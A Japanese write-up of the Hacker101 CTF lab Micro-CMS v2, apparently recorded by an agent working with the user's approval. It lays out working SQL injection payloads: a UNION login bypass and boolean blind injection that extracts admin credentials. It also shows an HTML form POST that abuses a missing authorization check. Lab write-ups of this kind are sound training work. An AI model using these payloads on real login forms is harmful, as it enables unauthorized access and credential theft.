# Micro-CMS v2 — 解法と調査記録

- 実施日: 2026-10-29
- 対象: [Hacker101 CTF の Micro-CMS v2](https://ctf.hacker101.com/ctf)
- 状態: **3/3 提出済み**。CTF 一覧で 3/3、全体 18/26 点を確認
- 課題インスタンスのホスト名、セッション情報、フラグ値は公開しない

## 初期確認

1. v1 の実験環境が起動中は、v2 の Start リンクが無効だった。v1 を終了すると v2 を起動できた。
2. v2 のトップページには「Micro-CMS Changelog」と「Markdown Test」、新規ページ作成リンクがある。
3. Changelog には、ユーザー認証を追加し、ページの追加・編集には通常管理者権限が必要と書かれていた。
4. 未認証の状態で「Edit this page」を開くとログイン画面へ転送された。未認証の `/page/3` は 403 Forbidden だった。

## Flag0: UNION によるログインと非公開ページ

本人が学習用 CTF のログインフォームで SQL インジェクションを試すことを明示的に承認した後で検証した。

- ユーザー名 `' OR 1=1--` は 500 Internal Server Error。
- `admin' -- ` と `admin` は「Unknown user」。
- `' OR 1=1 LIMIT 1-- ` は「Invalid password」となり、入力によりユーザー名検索結果が変わることを確認した。
- 次の値をユーザー名、`pass` をパスワードに入力すると「Logged In!」が表示された。

```sql
' UNION SELECT 'pass' AS password FROM admins WHERE '1' = '1
```

ログイン後、ホームに「Private Page」(`/page/3`) が現れた。開くと本文にフラグがあり、提出後に Flag0 が Found となった。

この UNION 入力は [公開 writeup](https://github.com/ternera/hacker101-ctf/blob/main/Micro-CMS%20v2.md) を手掛かりにし、今回の課題インスタンスで動作を確認した。内部 SQL の全体は未確認。

## Flag1: 未認証 POST に対する権限確認漏れ

1. 管理者の状態で既存ページ `/page/edit/1` を内容変更なしで保存したが、フラグは出なかった。
2. 既存ページを変更しないため、新規の公開検証ページを作り、本文に次のフォームを置いた。

   ```html
   <form method="POST" action="/page/edit/1">
     <button type="submit">Check POST authorization</button>
   </form>
   ```

3. ログアウト後も検証ページが公開されていることを確認した。
4. 未認証でフォームのボタンを押すと、`/page/edit/1` への POST の応答本文にフラグが表示された。
5. フラグを提出し、CTF 一覧で 2/3 となった。

シェルからの直接 POST は、作業環境で課題ホスト名を名前解決できず実行できなかった。上記はブラウザで実行して確認した手順。検証ページは課題インスタンス内に残っている。

## Flag2: 真偽判定による資格情報の特定

公開 writeup の資格情報をそのまま入力しても「Unknown user」で、インスタンスごとに値が異なった。SQL エラーに値を表示させる試みも詳細のない 500 応答になったため、ログイン画面の応答を真偽判定に使った。

ユーザー名に次の形式、パスワードに任意の誤った値（例: `x`）を入力する。

```sql
' OR (<条件>) LIMIT 1-- 
```

`<条件>` が真のとき「Invalid password」、偽のとき「Unknown user」と表示された。まず `1=1` と `1=0` で両方の応答を確認した。その後、`admins` テーブルの先頭行に対して、長さと各文字の ASCII コードを二分探索した。

```sql
LENGTH((SELECT username FROM admins LIMIT 1)) > 5
ASCII(SUBSTR((SELECT username FROM admins LIMIT 1),1,1)) > 77
```

同様に `SELECT password FROM admins LIMIT 1` を対象にし、ユーザー名とパスワードを特定した。実際の値はインスタンス固有のためここには掲載しない。特定した値を改変しない通常のログインフォームに入力すると、応答に Flag2 が表示された。提出後、CTF 一覧で Micro-CMS v2 が **3/3**、全体が **18/26 点**になった。

真偽判定の着想は [公開 writeup](https://github.com/pkemkes/ctf-writeups/blob/master/hacker101/03/README.md) を参考にし、このインスタンスで両分岐と抽出結果を検証した。

## ブラウザの動作

直前のセッションではクリック操作がタイムアウトしたが、今回の Private Page 閲覧、3 個のフラグ提出、フォームの POST、真偽判定による資格情報の特定を含む操作ではタイムアウトは再発しなかった。